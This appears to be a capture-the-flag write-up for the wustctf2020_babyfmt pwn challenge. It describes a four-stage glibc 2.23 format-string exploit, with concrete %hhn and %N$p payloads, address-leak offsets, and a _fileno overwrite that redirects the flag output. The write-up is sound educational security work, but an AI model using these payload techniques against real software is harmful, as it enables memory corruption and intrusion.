# wustctf2020_babyfmt — 4-stage format string + `stdout._fileno` redirect

> **Flag**: `flag{a38fcaa0-c9de-484a-a2da-e6862ec50faf}` (rotated per connection on BUUCTF)
>
> A textbook glibc-2.23 single-format-string challenge that stacks four classic fmt techniques: (1) `%hhn` to bypass a single-shot guard, (2) `%N$p` to leak PIE + libc, (3) `%N$s` to read a BSS-resident `secret` via a buffer-embedded pointer, and (4) `%hhn` to overwrite `_IO_2_1_stdout_._fileno`. The last technique is what makes the challenge interesting — the win function `get_flag()` deliberately `close(1)` before `printf("%s", flag_bytes)`, so the only way the flag escapes is if `stdout` has already been rewired to point at fd 2 (which remote socat keeps connected to the socket).

## 0. File overview

| Field | Value |
|---|---|
| File | `wustctf2020_babyfmt` |
| Format | ELF 64-bit LSB, x86-64, dynamic, PIE |
| Protections | Full RELRO / Canary / NX / PIE (not stripped) |
| Remote | `node5.buuoj.cn:25690` (IP `117.21.200.176`, DNS bypass) |
| libc | glibc 2.23 (Ubuntu 16.04) |

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

## 1. Program structure

```c
int main() {
    initial();                  // open /dev/urandom, read 64 bytes into secret[]
    ask_time();                 // 3-scanf banner, no vuln
    int bool_leak=0, bool_fmt=0;
    while (1) {
        menu();                 // print 4 options
        switch (get_int()) {
            case 1: leak(&bool_leak); break;
            case 2: fmt_attack(&bool_fmt); break;     // ★ vulnerable printf
            case 3: get_flag(); break;                 // ★★ win, with traps
            case 4: exit(0);
        }
    }
}

void fmt_attack(int *bool_p) {
    char buf[0x40] = {0};
    if (*bool_p > 0) { puts("No way!"); exit(1); }    // one-shot guard
    *bool_p = 1;
    read_n(buf, 0x28);
    printf(buf);                                       // ★ format string vuln
}

void get_flag() {
    char buf[0x60] = {0};
    puts("If you can open the door!");
    read_n(buf, 0x40);
    if (strncmp(&secret, buf, 0x40)) { puts("No way!"); exit(1); }

    close(1);                                          // ★★ closes stdout
    int fd = open("/flag", O_RDONLY);                  // returns lowest free = 1
    read(fd, buf, 0x50);                               // reads flag into buf
    printf(buf);                                       // writes to fd 1 → EBADF!
}
```

The trap: `printf(buf)` after `close(1)+open("/flag")` tries to write to fd 1, which is now the read-only flag file → `EBADF` → flag never reaches the client.

## 2. The four primitives

### 2.1 `%7$hhn` bypasses the one-shot guard

`fmt_attack` checks `*bool_p > 0` then sets `*bool_p = 1` before reading user input. After the first call further calls hit `puts("No way!"); exit(1)`.

But `bool_p` is a pointer passed in `rdi`, stored at `[rbp-0x48]` inside `fmt_attack`. In `printf`'s arg numbering this is `args[7]` (rsp+8 after sub rsp,0x50). `%7$hhn` writes 1 byte = 0 (zero chars output so far) to `*args[7]`, resetting the bool to 0. Now `fmt_attack` can be called any number of times.

### 2.2 PIE/libc leak via `%N$p`

Stack probe with `%1..%30$p` reveals stable PIE/libc pointers:

- `%17$p` = main+0x76 (return into main after `call fmt_attack`) → PIE base = leak - 0x102c
- `%23$p` = `__libc_start_main + delta` → libc base (delta auto-detected, `0xf0` on BUU remote, `0x100` on local patchelf)
- `%8$p` = `buffer[0:8]` = the format string itself echoing back (confirms buffer starts at args[8])

### 2.3 `%11$s` reads `secret` via buffer-embedded pointer

Args indexing (after probe confirmation):
- `args[8..12]` = `buffer[0:8], [8:16], [16:24], [24:32], [32:40]`

So putting `p64(secret_addr)` at `buffer[24:32]` makes `%11$s` dereference it. Payload:

```python
b'%7$hhn%11$s' + b'A' * 13 + p64(secret_addr)
#  11 bytes      13 bytes        8 bytes  = 32 bytes (≤ 0x28 read limit)
```

Output ends at first NUL in `secret` (urandom often has NUL within 64 bytes), but **strncmp also stops at NUL** so the leaked prefix suffices.

### 2.4 `%10$hhn` rewires `stdout._fileno`

The kill move. Before triggering `get_flag`, change `_IO_2_1_stdout_._fileno` from 1 to 2. After that, `close(1)` doesn't affect stdout's internal write target — printf will go to fd 2, which on the remote is the same socket as fd 0 (socat exec).

`_IO_FILE._fileno` is at offset +0x70 in glibc 2.23.

```python
stdout_fileno_addr = libc_base + libc.symbols['_IO_2_1_stdout_'] + 0x70

# Payload — output 2 chars before %hhn so it writes 2 (not 0):
b'%7$hhnaa%10$hhn' + b'X' + p64(stdout_fileno_addr)
#  15 bytes spec    1 pad   8 bytes addr = 24 bytes
```

`%10$hhn` writes 1 byte (low byte of int `_fileno`) = 2. Since the original `_fileno` was 0x00000001 and we only overwrite the low byte, the field becomes 0x00000002 = 2 ✓

## 3. Triggering `get_flag`

After the three fmt calls:
1. Send `secret_bytes + NUL_padding_to_64` as input to `get_flag`
2. `strncmp` compares up to first NUL → passes ✓
3. `close(1)` releases fd 1, `open("/flag")` returns fd 1 = flag file
4. `read(1, buf, 0x50)` reads flag into `buf`
5. `printf(buf)` writes to stdout — but stdout's `_fileno = 2` → write goes to fd 2 = socket
6. Flag arrives at client ✓

## 4. libc version handling (local vs remote)

This challenge highlights a subtle gotcha: **the exact glibc 2.23 sub-version matters for leak offsets**.

| libc package | `__libc_start_main` | leak delta | `_IO_2_1_stdout_` |
|---|---|---|---|
| BUU `libc-2.23-64bit.so` | 0x20740 | +0xf0 | 0x3c5620 |
| `2.23-0ubuntu3_amd64` | 0x20740 | +0xf0 | 0x3c4620 |
| `2.23-0ubuntu11.3_amd64` | 0x20750 | +0x100 | 0x3c5620 |

For local debugging I patched the binary with `patchelf` against `2.23-0ubuntu11.3_amd64`. The exp auto-detects delta:

```python
delta = (libc_leak - libc.symbols['__libc_start_main']) & 0xfff
libc_base = libc_leak - libc.symbols['__libc_start_main'] - delta
```

One exp works both local and remote.

## 5. Key payload sizes (bookkeeping)

Easy to miscount and produce SIGSEGV from a 1-byte misalignment:

| Specifier | Bytes |
|---|---|
| `%7$hhn` | 6 |
| `%17$p` | 5 |
| `%11$s` | 5 |
| `%10$hhn` | 7 |
| `%23$p` | 5 |
| `p64(addr)` | 8 |

Always assert payload length / position after construction:

```python
assert len(b'%7$hhn%11$s') == 11
assert len(payload2) == 32
assert payload2[24:32] == p64(secret_addr)
```

## 6. Lessons

- **`%hhn` resets a bool in 1 byte** — when a fmt vuln has a one-shot guard but the guard variable's address is reachable on the stack, partial writes break the guard cheaply.
- **`close(1)+open(X)` doesn't change `_IO_2_1_stdout_._fileno`** — glibc's userspace FILE struct is independent of kernel fd table. Pre-rewriting `_fileno` is the canonical bypass.
- **Pre-rewrite to fd 2, not 0** — fd 2 (stderr) on remote BUUCTF setups is connected to the same socket via socat exec; fd 0 is stdin (read-only from kernel side, write fails).
- **strncmp stops at NUL** — secret leakage doesn't need to be complete. Leak to first NUL, then send the leaked prefix + NUL + arbitrary padding.
- **regex greedy quantifier on leak parsing** — `0x[0-9a-f]+` will eat menu characters; use lookahead `0x[0-9a-f]+(?=[^0-9a-f])` or append a non-hex separator to payloads.
- **glibc 2.23 sub-version matters** — Ubuntu 16.04's libc-2.23-0ubuntu3 and libc-2.23-0ubuntu11.3 differ in symbol offsets (0x10 difference for `__libc_start_main`). Always auto-detect delta from low-12 bits.
- **`patchelf` for local-remote parity** — patch interpreter + rpath to point at the BUU-version libc so local offsets match remote.

## 7. Key concepts referenced

- I/O FILE struct manipulation (`_IO_2_1_stdout_._fileno` rewrite)
- Format string `%hhn` partial write
- Single-shot guard bypass via stack-resident guard variable
- glibc 2.23 + Ubuntu 16.04 BUU libc consistency

## 8. References

LynneHuan's writeup provided the high-level idea:
https://www.cnblogs.com/LynneHuan/p/15229706.html
